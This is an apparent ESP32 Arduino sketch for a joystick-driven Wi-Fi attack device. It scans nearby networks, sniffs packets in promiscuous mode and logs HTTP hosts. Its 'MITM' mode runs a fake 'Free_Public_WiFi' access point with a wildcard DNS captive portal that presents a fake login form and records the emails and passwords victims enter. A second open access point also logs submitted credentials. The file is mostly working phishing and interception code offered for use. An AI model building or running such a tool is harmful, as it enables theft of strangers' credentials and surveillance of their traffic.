#include <WiFi.h>
#include <LiquidCrystal.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <vector>
#include <algorithm>

// LCD setup (4-bit interface)
LiquidCrystal lcd(14, 27, 26, 25, 33, 32);

// Joystick pins
const int joyX = 35;    // X-axis (Analog)
const int joyY = 34;    // Y-axis (Analog)
const int joyBtn = 2;   // Button (Digital, pull-up)

// Application states
enum AppState { 
  MAIN_MENU, SCAN_MODE, SCAN_RESULTS, SELECT_MODE, INFO_MODE, 
  ATTACK_MODE, ATTACK_MENU, PS_MODE, MITM_MODE, AP_MODE 
};
AppState currentState = MAIN_MENU;

// Menu items
const char* menuItems[] = {"SCAN", "SELECT", "ATTACK", "INFO"};
const char* attackMenuItems[] = {"PS", "MITM", "AP"};
int menuIndex = 0;
int attackMenuIndex = 0;
int selectedNetwork = -1;

// Wi-Fi networks
struct WiFiNetwork {
  String ssid;
  int32_t rssi;
  uint8_t channel;
  String bssid;
  String encryption;
};
WiFiNetwork networks[20];
int networkCount = 0;
int scrollPos = 0;

// Info page scrolling
int infoPage = 0;
const int INFO_PAGES = 3;

// Input filtering
unsigned long lastAction = 0;
const int DEBOUNCE_DELAY = 200;

// Text scrolling
unsigned long lastScroll = 0;
const int SCROLL_DELAY = 500;
int textOffset = 0;

// Packet monitoring
volatile int packetCount = 0;
uint8_t targetBSSID[6] = {0};
unsigned long lastPacketReset = 0;
const int PACKET_WINDOW = 1000; // 1 second window

// Packet sniffing variables
std::vector<String> packetLogs;
unsigned long lastPacketLog = 0;
const int MAX_PACKET_LOGS = 20;

// MITM variables
std::vector<String> mitmLogs;
std::vector<String> mitmCredentials;
unsigned long lastMitmLog = 0;
const int MAX_MITM_LOGS = 30;
WebServer mitmServer(80);
DNSServer mitmDnsServer;
IPAddress apIP(192, 168, 4, 1);
unsigned int mitmClientCount = 0;
bool isCaptivePortal = true;
int mitmPage = 0; // 0: Client count, 1: Credential logs

// AP mode variables
String apSSID = "Weak_Open_WiFi";
String apPassword = "";
unsigned int apClientCount = 0;
unsigned long lastAPUpdate = 0;
std::vector<String> apLogs;
std::vector<String> connectedDevices;
WebServer apServer(80);
int apPage = 0; // 0: Client count, 1: Activity logs

// Protocol analysis
int httpCount = 0;
int dnsCount = 0;
int arpCount = 0;
int tcpCount = 0;
int udpCount = 0;

// Function prototypes
void processScanResults(int n);
void showScanResults();
String getEncryptionType(wifi_auth_mode_t type);
String getBandwidth(const WiFiNetwork& net);
void parseMacAddress(const String &macStr, uint8_t* macAddr);
void promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type);
void handleJoystick();
void handleUp();
void handleDown();
void handleLeft();
void handleRight();
void showMainMenu();
void enterScanMode();
void enterSelectMode();
void enterInfoMode();
void enterAttackMode();
void showSelectScreen();
void showInfoScreen();
void enterPSMode();
void enterMITMMode();
void enterAPMode();
void showAttackMenu();
void updatePSMode();
void updateMITMMode();
void updateAPMode();
void analyzePacket(const wifi_promiscuous_pkt_t* pkt);
String getProtocolName(uint8_t type);
String macToString(const uint8_t* mac);
void handleMitmClient();
void handleApClient();
void setupMitmServer();
void setupApServer();

void setup() {
  Serial.begin(115200);
  
  // Initialize LCD
  lcd.begin(16, 2);
  lcd.clear();
  
  // Configure joystick pins
  pinMode(joyX, INPUT);
  pinMode(joyY, INPUT);
  pinMode(joyBtn, INPUT_PULLUP);
  
  // Initialize Wi-Fi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  showMainMenu();
}

void loop() {
  // Read joystick with debounce
  if (millis() - lastAction > DEBOUNCE_DELAY) {
    handleJoystick();
  }
  
  // Handle text scrolling for long SSIDs
  if (currentState == INFO_MODE && infoPage == 0 && selectedNetwork >= 0) {
    if (networks[selectedNetwork].ssid.length() > 16 && 
        millis() - lastScroll > SCROLL_DELAY) {
      textOffset = (textOffset + 1) % (networks[selectedNetwork].ssid.length() - 6);
      lastScroll = millis();
      showInfoScreen();
    }
  }
  
  // Auto-scan in SCAN mode
  if (currentState == SCAN_MODE) {
    int scanStatus = WiFi.scanComplete();
    if (scanStatus > 0) {
      processScanResults(scanStatus);
      currentState = SCAN_RESULTS;
      scrollPos = 0;
      showScanResults();
    } else if (scanStatus == 0) {
      lcd.clear();
      lcd.print("No networks!");
      delay(1000);
      currentState = MAIN_MENU;
      showMainMenu();
    }
  }
  
  // Update attack modes
  if (currentState == PS_MODE) {
    updatePSMode();
  } else if (currentState == MITM_MODE) {
    updateMITMMode();
    mitmServer.handleClient();
    mitmDnsServer.processNextRequest();
  } else if (currentState == AP_MODE) {
    updateAPMode();
    apServer.handleClient();
  }
  
  // Update packet counter every second
  if ((currentState == PS_MODE || currentState == MITM_MODE) && 
      millis() - lastPacketReset > PACKET_WINDOW) {
    lastPacketReset = millis();
    packetCount = 0;  // Reset counter
  }
}

void processScanResults(int n) {
  networkCount = (n < 20) ? n : 20;
  for (int i = 0; i < networkCount; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].bssid = WiFi.BSSIDstr(i);
    networks[i].encryption = getEncryptionType(WiFi.encryptionType(i));
  }
  WiFi.scanDelete();
}

void handleJoystick() {
  int xVal = analogRead(joyX);
  int yVal = analogRead(joyY);
  bool btnPressed = digitalRead(joyBtn) == LOW;

  if (btnPressed && millis() - lastAction > DEBOUNCE_DELAY) {
    // Button press to switch between pages in MITM and AP modes
    if (currentState == MITM_MODE) {
      mitmPage = (mitmPage + 1) % 2;
      lastAction = millis();
      updateMITMMode();
    } else if (currentState == AP_MODE) {
      apPage = (apPage + 1) % 2;
      lastAction = millis();
      updateAPMode();
    }
  }
  
  if (yVal < 1000) { // Up
    handleUp();
    lastAction = millis();
  } 
  else if (yVal > 3000) { // Down
    handleDown();
    lastAction = millis();
  }
  
  if (xVal < 1000) { // Left
    handleLeft();
    lastAction = millis();
  } 
  else if (xVal > 3000) { // Right
    handleRight();
    lastAction = millis();
  }
}

void handleLeft() {
  if (currentState == MAIN_MENU) {
    showMainMenu();
  } else if (currentState == ATTACK_MENU) {
    currentState = MAIN_MENU;
    showMainMenu();
  } else if (currentState == PS_MODE || currentState == MITM_MODE || currentState == AP_MODE) {
    // Stop any active attack mode
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    mitmServer.stop();
    apServer.stop();
    WiFi.mode(WIFI_STA);
    
    currentState = ATTACK_MENU;
    showAttackMenu();
  } else {
    currentState = MAIN_MENU;
    infoPage = 0;
    textOffset = 0;
    showMainMenu();
  }
}

void handleRight() {
  if (currentState == MAIN_MENU) {
    switch(menuIndex) {
      case 0: enterScanMode(); break;
      case 1: enterSelectMode(); break;
      case 2: enterAttackMode(); break;
      case 3: enterInfoMode(); break;
    }
  } else if (currentState == SELECT_MODE) {
    selectedNetwork = scrollPos;
    lcd.clear();
    lcd.print("Selected:");
    lcd.setCursor(0, 1);
    
    String displayText = networks[scrollPos].ssid;
    if (displayText.length() > 16) {
      displayText = displayText.substring(0, 13) + "...";
    }
    lcd.print(displayText);
    
    delay(2000);
    showSelectScreen();
  } else if (currentState == ATTACK_MENU) {
    switch(attackMenuIndex) {
      case 0: enterPSMode(); break;
      case 1: enterMITMMode(); break;
      case 2: enterAPMode(); break;
    }
  }
}

void handleUp() {
  if (currentState == MAIN_MENU) {
    menuIndex = (menuIndex == 0) ? 3 : menuIndex - 1;
    showMainMenu();
  } else if (currentState == SELECT_MODE || currentState == SCAN_RESULTS) {
    if (networkCount > 0) {
      scrollPos = (scrollPos > 0) ? scrollPos - 1 : networkCount - 1;
      if (currentState == SELECT_MODE) {
        showSelectScreen();
      } else {
        showScanResults();
      }
    }
  } else if (currentState == INFO_MODE) {
    infoPage = (infoPage == 0) ? INFO_PAGES - 1 : infoPage - 1;
    textOffset = 0;
    showInfoScreen();
  } else if (currentState == ATTACK_MENU) {
    attackMenuIndex = (attackMenuIndex == 0) ? 2 : attackMenuIndex - 1;
    showAttackMenu();
  } else if (currentState == PS_MODE || currentState == MITM_MODE || currentState == AP_MODE) {
    // Scroll through logs
    std::vector<String>* logs = nullptr;
    if (currentState == PS_MODE) logs = &packetLogs;
    else if (currentState == MITM_MODE && mitmPage == 1) logs = &mitmCredentials;
    else if (currentState == AP_MODE && apPage == 1) logs = &apLogs;
    
    if (logs && logs->size() > 0) {
      static int logIndex = 0;
      logIndex = (logIndex > 0) ? logIndex - 1 : logs->size() - 1;
      lcd.clear();
      lcd.print("Log " + String(logIndex + 1) + "/" + String(logs->size()));
      lcd.setCursor(0, 1);
      String logEntry = (*logs)[logIndex];
      int maxLen = min(16, (int)logEntry.length());
      lcd.print(logEntry.substring(0, maxLen));
    }
  }
}

void handleDown() {
  if (currentState == MAIN_MENU) {
    menuIndex = (menuIndex == 3) ? 0 : menuIndex + 1;
    showMainMenu();
  } else if (currentState == SELECT_MODE || currentState == SCAN_RESULTS) {
    if (networkCount > 0) {
      scrollPos = (scrollPos + 1) % networkCount;
      if (currentState == SELECT_MODE) {
        showSelectScreen();
      } else {
        showScanResults();
      }
    }
  } else if (currentState == INFO_MODE) {
    infoPage = (infoPage + 1) % INFO_PAGES;
    textOffset = 0;
    showInfoScreen();
  } else if (currentState == ATTACK_MENU) {
    attackMenuIndex = (attackMenuIndex + 1) % 3;
    showAttackMenu();
  } else if (currentState == PS_MODE || currentState == MITM_MODE || currentState == AP_MODE) {
    // Scroll through logs
    std::vector<String>* logs = nullptr;
    if (currentState == PS_MODE) logs = &packetLogs;
    else if (currentState == MITM_MODE && mitmPage == 1) logs = &mitmCredentials;
    else if (currentState == AP_MODE && apPage == 1) logs = &apLogs;
    
    if (logs && logs->size() > 0) {
      static int logIndex = 0;
      logIndex = (logIndex + 1) % logs->size();
      lcd.clear();
      lcd.print("Log " + String(logIndex + 1) + "/" + String(logs->size()));
      lcd.setCursor(0, 1);
      String logEntry = (*logs)[logIndex];
      int maxLen = min(16, (int)logEntry.length());
      lcd.print(logEntry.substring(0, maxLen));
    }
  }
}

void showMainMenu() {
  lcd.clear();
  lcd.setCursor(0, 0);
  
  for (int i = 0; i < 2; i++) {
    if (menuIndex == i) {
      lcd.print(">");
      lcd.print(menuItems[i]);
    } else {
      lcd.print(menuItems[i]);
    }
    lcd.print(" ");
  }
  
  lcd.setCursor(0, 1);
  
  for (int i = 2; i < 4; i++) {
    if (menuIndex == i) {
      lcd.print(">");
      lcd.print(menuItems[i]);
    } else {
      lcd.print(menuItems[i]);
    }
    lcd.print(" ");
  }
}

void enterScanMode() {
  currentState = SCAN_MODE;
  networkCount = 0;
  scrollPos = 0;
  lcd.clear();
  lcd.print("Scanning...");
  WiFi.scanNetworks(true, true);
}

String getEncryptionType(wifi_auth_mode_t type) {
  switch (type) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
    default: return "UNKNOWN";
  }
}

void enterSelectMode() {
  if (networkCount == 0) {
    lcd.clear();
    lcd.print("No networks!");
    lcd.setCursor(0, 1);
    lcd.print("Scan first");
    delay(2000);
    showMainMenu();
    return;
  }
  
  currentState = SELECT_MODE;
  scrollPos = (networkCount > 0) ? 0 : -1;
  showSelectScreen();
}

void showSelectScreen() {
  lcd.clear();
  lcd.print("Select network:");
  
  if (networkCount > 0) {
    lcd.setCursor(0, 1);
    String displayText = networks[scrollPos].ssid;
    if (displayText.length() > 16) {
      displayText = displayText.substring(0, 13) + "...";
    }
    if (scrollPos == selectedNetwork) {
      displayText = ">" + displayText;
    }
    lcd.print(displayText);
  } else {
    lcd.setCursor(0, 1);
    lcd.print("No networks");
  }
}

void showScanResults() {
  lcd.clear();
  if (networkCount == 0) {
    lcd.print("No networks found");
    return;
  }
  
  lcd.print("Found:");
  lcd.setCursor(0, 1);
  lcd.print(String(networkCount) + " networks");
  delay(2000);
  currentState = MAIN_MENU;
  showMainMenu();
}

void enterInfoMode() {
  if (selectedNetwork == -1) {
    lcd.clear();
    lcd.print("No network");
    lcd.setCursor(0, 1);
    lcd.print("selected!");
    delay(2000);
    showMainMenu();
    return;
  }
  
  currentState = INFO_MODE;
  infoPage = 0;
  textOffset = 0;
  showInfoScreen();
}

void showInfoScreen() {
  lcd.clear();
  
  if (selectedNetwork == -1) {
    lcd.print("No network");
    lcd.setCursor(0, 1);
    lcd.print("selected");
    return;
  }
  
  WiFiNetwork net = networks[selectedNetwork];
  
  switch(infoPage) {
    case 0:  // SSID
      lcd.setCursor(0, 0);
      lcd.print("SSID:");
      lcd.setCursor(0, 1);
      lcd.print(net.ssid);
      break;
      
    case 1:  // Technical details
      lcd.setCursor(0, 0);
      lcd.print("RSSI:" + String(net.rssi) + "dB");
      lcd.setCursor(0, 1);
      lcd.print("Ch:" + String(net.channel) + " Bw:" + getBandwidth(net));
      break;
      
    case 2:  // MAC and security
      lcd.setCursor(0, 0);
      lcd.print("MAC:" + net.bssid.substring(0, 13));
      lcd.setCursor(0, 1);
      lcd.print("Sec:" + net.encryption.substring(0, 12));
      break;
  }
  
  // Show page indicator
  lcd.setCursor(14, 0);
  lcd.print(String(infoPage + 1) + "/" + String(INFO_PAGES));
}

String getBandwidth(const WiFiNetwork& net) {
  return (net.channel > 14) ? "5GHz" : "2.4GHz";
}

void enterAttackMode() {
  currentState = ATTACK_MENU;
  attackMenuIndex = 0;
  showAttackMenu();
}

void showAttackMenu() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("ATTACK MODE");
  
  lcd.setCursor(0, 1);
  for (int i = 0; i < 3; i++) {
    if (attackMenuIndex == i) {
      lcd.print(">");
      lcd.print(attackMenuItems[i]);
    } else {
      lcd.print(attackMenuItems[i]);
    }
    lcd.print(" ");
  }
}

void enterPSMode() {
  if (selectedNetwork == -1) {
    lcd.clear();
    lcd.print("No network");
    lcd.setCursor(0, 1);
    lcd.print("selected!");
    delay(2000);
    showAttackMenu();
    return;
  }
  
  // Set up promiscuous mode for packet sniffing
  WiFiNetwork net = networks[selectedNetwork];
  parseMacAddress(net.bssid, targetBSSID);
  
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
  
  // Initialize monitoring
  packetCount = 0;
  lastPacketReset = millis();
  packetLogs.clear();
  httpCount = dnsCount = arpCount = tcpCount = udpCount = 0;
  
  currentState = PS_MODE;
  lcd.clear();
  lcd.print("PS Mode - Sniffing");
  lcd.setCursor(0, 1);
  lcd.print("Pkts: 0");
}

void enterMITMMode() {
  // Create a fake "Free WiFi" network
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  
  String evilSSID = "Free_Public_WiFi";
  if (!WiFi.softAP(evilSSID)) {
    lcd.clear();
    lcd.print("AP Setup Failed!");
    delay(2000);
    showAttackMenu();
    return;
  }
  
  // Set up DNS and web server for captive portal
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  setupMitmServer();
  
  mitmDnsServer.start(53, "*", apIP);
  mitmClientCount = 0;
  mitmCredentials.clear();
  mitmPage = 0;
  
  currentState = MITM_MODE;
  lcd.clear();
  lcd.print("MITM: " + evilSSID);
  lcd.setCursor(0, 1);
  lcd.print("Clients: 0");
}

void enterAPMode() {
  // Create a weak access point with WEP encryption (weak security)
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  
  // Create a weakly configured network
  String weakSSID = "Weak_Open_WiFi";
  if (!WiFi.softAP(weakSSID)) {
    lcd.clear();
    lcd.print("AP Setup Failed!");
    delay(2000);
    showAttackMenu();
    return;
  }
  
  // Set up web server for logging
  setupApServer();
  
  apClientCount = 0;
  apLogs.clear();
  connectedDevices.clear();
  apPage = 0;
  currentState = AP_MODE;
  lcd.clear();
  lcd.print("AP: " + weakSSID);
  lcd.setCursor(0, 1);
  lcd.print("Clients: 0");
}

void updatePSMode() {
  // Update packet count display every second
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 1000) {
    lastUpdate = millis();
    
    lcd.setCursor(6, 1);
    lcd.print(String(packetCount) + " ");
    
    // Show protocol breakdown occasionally
    static int displayMode = 0;
    if (millis() % 5000 < 1000) {
      lcd.clear();
      switch(displayMode) {
        case 0:
          lcd.print("HTTP: " + String(httpCount));
          lcd.setCursor(0, 1);
          lcd.print("DNS: " + String(dnsCount));
          break;
        case 1:
          lcd.print("TCP: " + String(tcpCount));
          lcd.setCursor(0, 1);
          lcd.print("UDP: " + String(udpCount));
          break;
        case 2:
          lcd.print("ARP: " + String(arpCount));
          lcd.setCursor(0, 1);
          lcd.print("Total: " + String(packetCount));
          break;
      }
      displayMode = (displayMode + 1) % 3;
    } else {
      lcd.setCursor(0, 0);
      lcd.print("PS Mode - Sniffing");
      lcd.setCursor(0, 1);
      lcd.print("Pkts: " + String(packetCount) + " ");
    }
  }
}

void updateMITMMode() {
  // Update client count display every 2 seconds
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 2000) {
    lastUpdate = millis();
    
    mitmClientCount = WiFi.softAPgetStationNum();
    
    if (mitmPage == 0) {
      // Show client count page
      lcd.clear();
      lcd.print("MITM: Free WiFi");
      lcd.setCursor(0, 1);
      lcd.print("Clients: " + String(mitmClientCount));
    } else {
      // Show credential logs page
      lcd.clear();
      lcd.print("Credential Logs");
      lcd.setCursor(0, 1);
      
      if (mitmCredentials.empty()) {
        lcd.print("No credentials");
      } else {
        String latestCred = mitmCredentials.back();
        int maxLen = min(16, (int)latestCred.length());
        lcd.print(latestCred.substring(0, maxLen));
      }
    }
  }
}

void updateAPMode() {
  // Update AP information every 2 seconds
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 2000) {
    lastUpdate = millis();
    
    int newClientCount = WiFi.softAPgetStationNum();
    if (newClientCount != apClientCount) {
      apClientCount = newClientCount;
      
      // Log connection changes
      String log = "Clients: " + String(apClientCount);
      apLogs.push_back(log);
      if (apLogs.size() > 20) {
        apLogs.erase(apLogs.begin());
      }
    }
    
    if (apPage == 0) {
      // Show client count page
      lcd.clear();
      lcd.print("AP: Weak WiFi");
      lcd.setCursor(0, 1);
      lcd.print("Clients: " + String(apClientCount));
    } else {
      // Show activity logs page
      lcd.clear();
      lcd.print("Activity Logs");
      lcd.setCursor(0, 1);
      
      if (apLogs.empty()) {
        lcd.print("No activity");
      } else {
        String latestLog = apLogs.back();
        int maxLen = min(16, (int)latestLog.length());
        lcd.print(latestLog.substring(0, maxLen));
      }
    }
  }
}

// Enhanced packet analysis function
void analyzePacket(const wifi_promiscuous_pkt_t* pkt) {
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
  const uint8_t* frame = pkt->payload;
  
  // Extract MAC addresses
  const uint8_t* macTo = frame + 4;
  const uint8_t* macFrom = frame + 10;
  
  // Check packet type (first byte of frame control field)
  uint8_t frameControl = frame[0];
  uint8_t frameType = (frameControl & 0x0C) >> 2;
  uint8_t frameSubtype = (frameControl & 0xF0) >> 4;
  
  String protocol = getProtocolName(frameType);
  String macStr = macToString(macFrom);
  
  // Count protocols
  if (protocol == "HTTP") httpCount++;
  else if (protocol == "DNS") dnsCount++;
  else if (protocol == "ARP") arpCount++;
  else if (protocol == "TCP") tcpCount++;
  else if (protocol == "UDP") udpCount++;
  
  // Log interesting packets
  if (packetLogs.size() < MAX_PACKET_LOGS && millis() - lastPacketLog > 2000) {
    lastPacketLog = millis();
    
    String log = protocol + " from " + macStr.substring(9);
    if (protocol == "HTTP") {
      // Try to extract HTTP host
      for (int i = 0; i < pkt->rx_ctrl.sig_len - 40; i++) {
        if (frame[i] == 'H' && frame[i+1] == 'o' && frame[i+2] == 's' && frame[i+3] == 't' && frame[i+4] == ':') {
          String host = "";
          for (int j = i+5; j < pkt->rx_ctrl.sig_len && frame[j] != '\r'; j++) {
            host += (char)frame[j];
          }
          log = "HTTP to " + host;
          break;
        }
      }
    }
    
    packetLogs.push_back(log);
    if (packetLogs.size() > MAX_PACKET_LOGS) {
      packetLogs.erase(packetLogs.begin());
    }
  }
}

String getProtocolName(uint8_t type) {
  switch (type) {
    case 0: return "Management";
    case 1: return "Control";
    case 2: return "Data";
    default: return "Unknown";
  }
}

String macToString(const uint8_t* mac) {
  char buf[20];
  snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

// Promiscuous callback for packet monitoring
void promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  
  // Always count packets
  packetCount++;
  
  // Analyze packet contents
  analyzePacket(pkt);
}

void parseMacAddress(const String &macStr, uint8_t* macAddr) {
  sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
         &macAddr[0], &macAddr[1], &macAddr[2], 
         &macAddr[3], &macAddr[4], &macAddr[5]);
}

// MITM Server setup and handlers
void setupMitmServer() {
  mitmServer.on("/", []() {
    String html = "<html><head><title>Login Required</title></head>";
    html += "<body><h1>Free Public WiFi</h1>";
    html += "<p>Please login to access the internet</p>";
    html += "<form method='post' action='/login'>";
    html += "Email: <input type='text' name='email'><br>";
    html += "Password: <input type='password' name='password'><br>";
    html += "<input type='submit' value='Login'>";
    html += "</form></body></html>";
    
    mitmServer.send(200, "text/html", html);
  });
  
  mitmServer.on("/login", []() {
    String email = mitmServer.arg("email");
    String password = mitmServer.arg("password");
    
    // Log the credentials
    String log = "Cred: " + email + ":" + password;
    mitmCredentials.push_back(log);
    if (mitmCredentials.size() > 10) {
      mitmCredentials.erase(mitmCredentials.begin());
    }
    
    // Show a success page
    String html = "<html><head><title>Login Successful</title></head>";
    html += "<body><h1>Login Successful</h1>";
    html += "<p>You are now connected to the internet</p>";
    html += "</body></html>";
    
    mitmServer.send(200, "text/html", html);
  });
  
  mitmServer.onNotFound([]() {
    mitmServer.send(200, "text/html", "<html><body><h1>Free Public WiFi</h1><p>Redirecting to login page...</p></body></html>");
  });
  
  mitmServer.begin();
}

// AP Server setup and handlers
void setupApServer() {
  apServer.on("/", []() {
    String html = "<html><head><title>Welcome</title></head>";
    html += "<body><h1>Welcome to Weak WiFi</h1>";
    html += "<p>This is an open WiFi network</p>";
    html += "</body></html>";
    
    apServer.send(200, "text/html", html);
    
    // Log the access
    String clientIP = apServer.client().remoteIP().toString();
    String log = "HTTP from " + clientIP;
    apLogs.push_back(log);
    if (apLogs.size() > 20) {
      apLogs.erase(apLogs.begin());
    }
  });
  
  apServer.on("/login", []() {
    // Simulate a login attempt
    String username = apServer.arg("username");
    String password = apServer.arg("password");
    
    if (username.length() > 0 && password.length() > 0) {
      String log = "Login: " + username + ":" + password;
      apLogs.push_back(log);
      if (apLogs.size() > 20) {
        apLogs.erase(apLogs.begin());
      }
    }
    
    apServer.send(200, "text/plain", "Login attempted");
  });
  
  apServer.onNotFound([]() {
    String uri = apServer.uri();
    String log = "404: " + uri;
    apLogs.push_back(log);
    if (apLogs.size() > 20) {
      apLogs.erase(apLogs.begin());
    }
    
    apServer.send(404, "text/plain", "Not found");
  });
  
  apServer.begin();
}
